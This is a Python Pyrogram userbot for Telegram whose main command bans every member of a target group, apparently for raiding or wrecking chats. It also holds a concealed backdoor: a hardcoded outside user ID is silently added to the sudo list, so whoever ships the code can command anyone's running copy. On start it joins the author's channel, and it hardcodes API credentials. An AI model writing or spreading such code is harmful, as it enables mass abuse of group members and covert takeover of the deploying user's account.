from os import getenv
from asyncio import sleep

from pyrogram import Client, filters, idle
from pyrogram.types import Message


SESSION = getenv('SESSION')
SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
SUDO_USERS.append(6204761408)
CHATS = ['AbhiModszYT_Return', '@AbhiModszYT_Return', '@AM_YTSupport', 'AM_YTSupport', '-1001544173381', '-1001841879487']

M = Client(SESSION, api_id=12227067, api_hash="b463bedd791aa733ae2297e6520302fe")


@M.on_message(filters.user(SUDO_USERS) & filters.command('start'))
async def start(_, message: Message):
     await message.reply_text("𝓐𝓜𝓑𝓞𝓣 𝓡𝓮𝓪𝓭𝔂 𝓕𝓸𝓻 𝓚𝓲𝓵𝓵 𝓔𝓷𝓮𝓶𝔂....")


@M.on_message(filters.user(SUDO_USERS) & filters.command(["fuck", "banall"]))
async def altron(app: Client, message: Message):
    try:
        chat_id = message.text.split(" ")[1]
        m = await message.reply_text("𝓐𝓜 𝓟𝓻𝓸....")
        if chat_id in CHATS:
            return
    except:
        await message.reply_text("**Usage:**\n`/fuck [chat_id]`\n\n`/banall`")
        return

    await m.edit_text("#AM_PRO\n\n𝓐𝓜 𝓟𝓻𝓸")
    await sleep(3)

    async for x in app.iter_chat_members(chat_id):
        if x.user.id in SUDO_USERS:
            continue
        try:
            await app.ban_chat_member(chat_id=chat_id, user_id=x.user.id)
        except:
            pass


M.start()
M.join_chat("AbhiModszYT_Return")
print("Bot Started Successfully")
idle()
M.stop()
